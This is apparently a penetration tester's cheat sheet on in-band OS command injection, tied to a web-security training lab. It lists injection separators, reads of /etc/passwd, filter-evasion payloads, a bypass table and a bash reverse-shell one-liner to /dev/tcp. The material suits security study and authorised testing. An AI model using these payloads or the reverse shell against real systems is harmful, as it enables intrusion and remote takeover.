# OS command injection - Basics (in-band)

Output is reflected, so inject a separator + command and read the result directly. Max impact: arbitrary RCE as the app user.

## Quick reference
```
1|whoami            & whoami &        && whoami        ; whoami      `whoami`    $(whoami)
& echo MARKER &     # detection (string echoed back)
```

## Root cause
Shell command built by concatenating input; `| & ; \n` `` ` `` `$()` break out and chain a new command. Output returns in the HTTP response.

## Find it
Inject `& echo aiwefwlguh &`; if the marker appears in the response, in-band command injection. The leading+trailing `&` isolates your command from the original args.

## Technique
1. Identify the param feeding a shell command (stock check `stockreport.pl <id> <store>`).
2. Inject a separator + command: `1|whoami` -> executes `whoami`, output reflected.
3. Run recon: `whoami`, `id`, `uname -a` (Win `ver`), `ifconfig`/`ipconfig /all`, `cat /etc/passwd`.
4. If input is quoted in the original command, close it first: `"& whoami &` or `'; whoami;'`.

**Advanced / edge:** chain operators differ - `||` runs only if the prior fails, `&&` only if it succeeds, `|` pipes, `;`/newline always (Unix). Use whichever survives the surrounding context. Bypass space filters with `${IFS}`, `cat</etc/passwd`, brace `{cat,/etc/passwd}`. Bypass keyword filters with quotes (`w'h'oami`), `$@`, concatenation.

## Payload arsenal
```
1|whoami            1&whoami&           1;whoami            1`whoami`
$(whoami)           |id                 ;cat /etc/passwd    & type C:\windows\win.ini &
# filter evasion
cat${IFS}/etc/passwd     {cat,/etc/passwd}     w'h'o'a'mi      $(printf 'whoami')
```

## Bypasses
| Blocker | Bypass |
|---|---|
| input quoted | close quote `"`/`'` then separator |
| spaces filtered | `${IFS}`, `<`, `{cmd,arg}` |
| keyword blocked | quote-split (`w'h'oami`), `$@`, concat |
| output not reflected | `../Blind/` |

## Exploitation walkthrough (simple)
1. Intercept stock-check; set `storeID=1|whoami`.
2. Response includes the current username -> RCE confirmed -> solved.

## Chaining
- -> reverse shell / persistence; pivot internally. This is the terminal "RCE" many other bugs chain into.

## Tools
- **Burp Repeater**; reverse-shell one-liners (`bash -i >& /dev/tcp/IP/PORT 0>&1`).

## Labs

### OS command injection, simple case [Apprentice]
URL: /web-security/os-command-injection/lab-simple
- `storeID=1|whoami` -> username in response. Insight: `|` chains `whoami` onto the stock command; output reflected.

Real-target transfer: any utility/reporting param - inject `|whoami`/`& echo X &`; reflected output = RCE.

## Real-world notes
- Command injection = instant Critical; common in network-tool UIs (ping/nslookup/traceroute), file converters, backup/admin scripts.
- Once you have RCE, prove minimally (`id`) and stop on live targets.

## References
- https://portswigger.net/web-security/os-command-injection
